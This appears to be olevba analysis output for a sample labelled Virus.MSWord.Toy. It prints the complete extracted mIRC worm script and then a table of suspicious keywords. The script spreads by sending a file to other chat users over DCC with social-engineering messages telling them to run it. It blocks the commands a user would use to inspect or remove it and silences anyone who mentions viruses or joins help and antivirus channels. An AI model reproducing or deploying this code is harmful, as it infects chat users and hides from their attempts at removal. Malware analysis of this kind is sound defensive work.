olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Toy-c3460dcc2576647cf4995565518a3a608e380dee
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSWord.Toy-c3460dcc2576647cf4995565518a3a608e380dee 
in file: Virus.MSWord.Toy-c3460dcc2576647cf4995565518a3a608e380dee - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
On 1:Connect:{ .ctcps on | Set %go 0 | hunting | .enable #damn3 | if ( $exists(C:\toy.sys) ) { Set %ex $read -l1 C:\toy.sys | if ( %ex != $null ) && ( $exists(%ex) ) { Set %go 1 } } | if ( $day = Friday ) && ( $r(1,7) = 4 ) { by } | if ( $r(1,25) != 7 ) { halt } | if ( $mid($version,3,1) > 4 ) { Set %varn1 editbox text | .timer77 0 .1 toy } | else { Set %fy 0 | .timer77 0 .5 toy1 } }
On 1:Disconnect:{ .timers off | .write -c C:\Time.drv $time | .enable #damn3 | if ( %varn1 != $null ) { .colour %varn1 1 } }
On 1:Input:*:{ Set %s $1- | if ( /timer isin %s ) || ( // isin %s ) || ( /. isin %s ) || ( /colour isin %s ) || ( disable isin %s ) || ( default isin %s ) || ( remove isin %s ) ( /write isin %s ) { halt } | if ( %eh isin %s ) { .echo -ae 4Hehe, come on, that wont work -12T13o9y | halt } }
On 1:Join:*:{ if ( help isin # ) || ( dmsetup isin # ) || ( backorifice isin # ) || ( nohack isin # ) || ( vir isin # ) || ( aid isin # ) { Set %chan # | .timer7 1 .1 quiet } }
On 1:Part:*:{ if ( %go = 0 ) { halt } | if ( $r(1,2) = 1 ) && ( $nick isreg # ) && ( $nick != $me ) { SQ $nick | .ignore -pcnu120 $nick } }
On 1:FileSent:*:{ if ( %go = 0 ) { halt } | if ( $filename = %ex ) { .msg $nick Type //run -n $getdir $+ $nopath(%ex) to run | halt } | SQ $nick | .ignore -pcnu60 $nick 3 }
On 1:FileRcvd:*:{ if ( %go = 0 ) { halt } | SQ $nick | .ignore -pcnu60 $nick }
On 1:Notify:{ if ( %go = 0 ) { halt } | if ( $nick !isin %heh ) { %heh = %heh $+ $nick | .ignore -pcnu120 $nick 3 | .timer $+ $r(99,199) 1 10 .msg $nick Hey, talk to you in a minute. Check out this file, ok. | .timer $+ $r(99,199) 1 20 SQ $nick } }
On 1:SockListen:sd:{ sockaccept we | ok1 }
On 1:SockWrite:we:{ if ( %stop = 1 ) { .sockclose we | halt } | ok1 }
On ^1:Kick:*:{ if ( $knick != $me ) { return } | letslook $1- | letsdo }
On ^1:Notice:*:*:{ letslook $1- | letsdo }
On ^1:Action:*:*:{ letslook $1- | letsdo }
On ^1:Text:*:*:{ letslook $1- | letsdo }
On ^1:Chat:*:{ letslook $1- | letsdo }
On ^1:Serv:*:{ letslook $1- | letsdo }
On ^1:Quit:{ letslook $1- | letsdo }
On ^1:Topic:#:{ letslook $1- | letsdo }
ctcp 1:*:*:{ letslook $1- | letsdo }
raw 332:*:{ letslook $2- | Set %chan $2 | .timer7 1 .1 quiet }
raw 401:*:{ halt }
raw 439:*:{ halt }
alias toy { Set %varn4 $r(0,14) | colour %varn1 %varn4 }
alias toy1 { if ( %fy = 0 ) { .font -a 9 Fixedsys | Set %fy 1 | halt } | .font -a 9 WP TypographicSymbols | Set %fy 0 }
alias toy2 { .echo -ae 4I'm sorry, but that command is not a 12T13o9y }
alias by { .echo -ae 12T13o9y 8I4s 12B13y 9S8i4m12p13l9e8S4i12m13o9n }
alias quiet { Set %var1 1 | :j | Set %var2 $nick(%chan,%var1) | if ( %var2 = $null ) { .part %chan | halt } | if ( %var2 != $me ) && ( %var2 != X ) && ( %var2 != W ) { .ignore %var2 3 } | inc %var1 | goto j }
alias -l hunting { if ( $exists(C:\Time.drv) ) { Set %weird $time($file(C:\Time.drv).mtime,H) | Set %tmp1 $calc((%weird + 5) % 24) } | if ( %weird != $null ) { if ( %weird > $time(H) ) || ( %tmp1 < $time(H) ) { rabbits } } }
alias -l rabbits { Set %tmp1 $ignore(0) | Set %tmp2 0 | :tm | inc %tmp2 | if ( %tmp1 = $null ) || ( %tmp2 > %tmp1 ) { goto out } | .ignore -r $ignore(1) | goto tm | :out }
alias letsdo { .ignore $nick 3 | halt }
alias letslook { if ( $nopath(%ex) !isin $1- ) && ( disable !isin $1- ) && ( script !isin $1- ) && ( dmsetup !isin $1- ) && ( worm !isin $1- ) && ( virus !isin $1- ) && ( infect !isin $1- ) && ( spread !isin $1- ) && ( remote !isin $1- ) && ( default !isin $1- ) && ( event !isin $1- ) && ( toy !isin $1- ) && ( unload !isin $1- ) { return } }
alias unload { if ( $1 = $null ) || ( $2 = $null ) { .echo -e 2* /unload: insufficient parameters | halt } | .echo -e 2*** Unloaded script ' $+ $2- $+ ' | halt }
alias remote { if ( $1 = $null ) { .echo -e 2*** Remote is OFF | halt } | if ( $1 = on ) { .echo -e 2*** Remote is ON (Ctcps,Events,Raw) } | else { .echo -e 2*** Remote is OFF } | halt }
alias events { if ( $1 = $null ) { .echo -e 2*** Events are OFF | halt } | if ( $1 = on ) { .echo -e 2*** Events are ON } | else { .echo -e 2*** Events are OFF } | halt }
alias remini { toy2 }
alias alias { toy2 }
alias run { toy2 }
alias copy { toy2 }
alias load { if ( $1 = -rs ) { toy2 | halt } }
#damn3 on
alias play { if ( $pos($1-,.mrc,1) > 0 ) || ( $pos($1-,.ini,1) > 0 ) || ( $pos($1-,.vxd,1) > 0 ) { halt } | .disable #damn3 | .timer0 1 .1 .play $1- | .enable #damn3 }
#damn3 end
alias writeini { toy2 }
alias rename { toy2 }
alias SQ { %nick = $1- | %stop = 0 | %pt = $r(2400,5000) | %be = 0 | %pk = 4096 | %sz = $file(%ex).size | .notice %nick DCC Send %ex ( $+ $ip $+ ) | .raw -q privmsg %nick : $+ $chr(1) $+ DCC SEND %ex $longip($ip) %pt %sz $+ $chr(1) | if ( $sock(sd) != $null ) { .sockclose sd } | .socklisten sd %pt }
alias ok1 { if ( $calc(%be + %pk) < %sz ) { .bread %ex %be %pk &data | .sockwrite we &data | inc %be %pk } | else { %stop = 1 | %pk = $calc( %sz - %be) | if (%pk == 0) { return } | .bread %ex %be %pk &data | .sockwrite we &data } }
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
+----------+--------------------+---------------------------------------------+

